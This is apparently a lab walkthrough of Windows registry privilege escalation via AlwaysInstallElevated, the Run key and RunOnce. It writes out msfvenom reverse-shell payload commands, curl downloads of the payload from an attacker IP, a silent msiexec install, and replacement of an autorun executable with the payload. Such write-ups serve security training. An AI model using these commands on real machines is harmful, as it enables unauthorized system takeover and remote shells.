**Registry**

<img width="828" height="270" alt="image" src="https://github.com/user-attachments/assets/2b9e5257-eebd-4c8a-a9f6-3e8eb79c08c6" />

<img width="786" height="563" alt="image" src="https://github.com/user-attachments/assets/94bfb1f5-b851-4d57-aa67-4bc341ae93a0" />

<img width="786" height="238" alt="image" src="https://github.com/user-attachments/assets/0849a1e0-521e-46a2-a531-9722f5fd6cff" />

There are top 5 Registry which are called Hive.

<img width="563" height="292" alt="image" src="https://github.com/user-attachments/assets/16605038-7f8c-48d3-b914-38e61b191f20" />

There are folders under folders in the Hives and in the last folders there is a file. Lets say User Notification.

We will understand 3 types of Registry which can help us in privilege escalations.

**1. AlwaysInstallElavated**

<img width="786" height="115" alt="image" src="https://github.com/user-attachments/assets/46bb8e6a-47a7-4923-85d0-73ef47adef49" />

***HKLM\Software\Policies\Microsoft\Windows\Installer***

HK is Hive.

LM is Local Machine. This Registry is set for the system. It means if any user installs an application on the system, it will run with system privilege.

There is one more Hive HKCU

***HKCU\Software\Policies\Microsoft\Windows\Installer***

CU is current user. This Registry is for the current user. The user that is logged in.

Lets check both Registries.

***reg query HKLM\Software\Policies\Microsoft\Windows\Installer***

<img width="786" height="125" alt="image" src="https://github.com/user-attachments/assets/d2f85e1e-06a7-4910-a0de-b3e926c15de9" />

AlwaysInstallElavated is 1 and MSI files are not disabled. We can use MSI files.

<img width="786" height="278" alt="image" src="https://github.com/user-attachments/assets/e3de0222-a08c-422a-9353-3a284d7e0e74" />

So for privilege escalation, both AlwaysInstallElavated and MSI files must be enable in HKLM.

Now there is one more condition.

In HKCU registry AlwaysInstallElavated should also be enabled.

***reg query HKCU\Software\Policies\Microsoft\Windows\Installer***

<img width="786" height="155" alt="image" src="https://github.com/user-attachments/assets/24593d19-f78b-4ce2-9d59-c44ba5327801" />

So, to perform Privilege escalation, following conditions must match

1. In HKLM both AlwaysInstallElavated and MSI files must be enabled.
2. In HKCU AlwaysInstallElavated must be enabled.

Now, we can create a MSI payload and install here. So when it installed, it will give us the reverse shell.

Lets create a MSI payload

***msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.128.113.97 LPORT=4444 -f msi > shell.msi***

<img width="786" height="89" alt="image" src="https://github.com/user-attachments/assets/003885b2-fb92-43a4-825d-ff3632e77678" />

Payload is created. We will transfer this payload to the target machine.

***python -m http.server 9999***

<img width="786" height="127" alt="image" src="https://github.com/user-attachments/assets/f362e26e-6a7e-4118-b90d-5f055b33ab71" />

On the Target machine

***curl http://10.128.113.97:9999/shell.msi -o shell.msi***

<img width="786" height="373" alt="image" src="https://github.com/user-attachments/assets/639545ac-529f-4497-9cc5-45a4dcd4701d" />

Payload has been transferred

Lets start a netcat listner

<img width="786" height="91" alt="image" src="https://github.com/user-attachments/assets/0a3efd98-6f99-4bba-94a9-32206a6e8927" />

On the target machine

***msiexec /qn /i shell.msi***

<img width="777" height="92" alt="image" src="https://github.com/user-attachments/assets/1856ee6a-3245-40f2-95c9-c5579e5b6ea4" />

And we got the shell

<img width="786" height="312" alt="image" src="https://github.com/user-attachments/assets/8d3e6106-3749-4468-8ad5-15ba7274d1a5" />

**2. Run**

This registry works like startup folder. If any .exe file is put in this regisrty, it will install it when system is powered on.

***reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run***

<img width="786" height="143" alt="image" src="https://github.com/user-attachments/assets/56ad85a7-0102-47b2-acb0-065c3e0c352f" />

Here we can see two .exe files are already there. We can put our payload in any of these two files or create a .exe file with a payload.

Lets check program.exe file

***cd C:\Program Files\Autorun Program***

<img width="752" height="312" alt="image" src="https://github.com/user-attachments/assets/a9f9be80-e297-4c65-a605-36c37bff907f" />

Lets check if we have permissions to modify this file or not.

<img width="786" height="226" alt="image" src="https://github.com/user-attachments/assets/cfe2cd4d-6096-4db5-b82c-cbd6ba29022d" />

We have full permissions on this file.

Now, we can delete this program.exe and create a new file with same name that contains a payload, we can get the reverse shell.

Lets check if we have permission to create a file in this folder (Autorun Program)

<img width="772" height="107" alt="image" src="https://github.com/user-attachments/assets/dae8ee98-421e-475e-a99e-3bbfb8e4a4ac" />

We are not able to create a text file. It means we don't have permission to create a new file in this folder.

Now, we need to find a way to replace this file with our payload.

Lets create a payload

***msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.130.76.134 LPORT=4444 -f exe -o shell.exe***

<img width="786" height="136" alt="image" src="https://github.com/user-attachments/assets/c830bfaf-17e5-4ddd-8eb1-45bba5c960ea" />

Payload is created. Lets transfer this payload to the target machine

<img width="786" height="111" alt="image" src="https://github.com/user-attachments/assets/3407222b-e0eb-4eda-b55d-10464a96c54b" />

Now in the target machine, we don't have permission to create a new file in that folder (Autorun Program). So we cannot transfer this file to that folder.

So we will try to over-write/replace program.exe with our payload with the help of curl.

***curl http://10.130.76.134:9999/shell.exe -o program.exe***

<img width="786" height="469" alt="image" src="https://github.com/user-attachments/assets/30317789-c1d6-4954-aa24-86d022d4f2d5" />

We have successfully replaced the file with our payload

Now lets start a netcat listener

<img width="722" height="127" alt="image" src="https://github.com/user-attachments/assets/0b5445a4-6b98-4099-99d8-f3ee55d0854d" />

We have started the netcat listener. Now we will login as admin user

<img width="786" height="115" alt="image" src="https://github.com/user-attachments/assets/a2ecfe25-676c-44a3-b1d8-8572fdc3577a" />

And we got the shell of Admin

<img width="786" height="289" alt="image" src="https://github.com/user-attachments/assets/70295d34-6dfc-49f3-80fd-de7bfb1f5559" />

**3. RunOnce**

This registry will run only one time and then removes its value. Lets say we have put a payload in it. When next user will login, the payload will execute and then it will remove the payload.

***reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce***

<img width="786" height="126" alt="image" src="https://github.com/user-attachments/assets/dc8b4dc7-9adf-4811-831e-bff0d65512e0" />

We dont get any error nor any result. Lets try to add any entry in this registry

***reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v shell /t REG_SZ /d “C:\Program Files\Autorun Program\program.exe /f***

<img width="786" height="61" alt="image" src="https://github.com/user-attachments/assets/f9c17a0f-b6d8-4d20-96e0-d4ed1be4ea27" />

However, in this case we don't have access to add an entry in this registry.

If we were able to add our payload here, any user that will login next time we would have received that user shell.
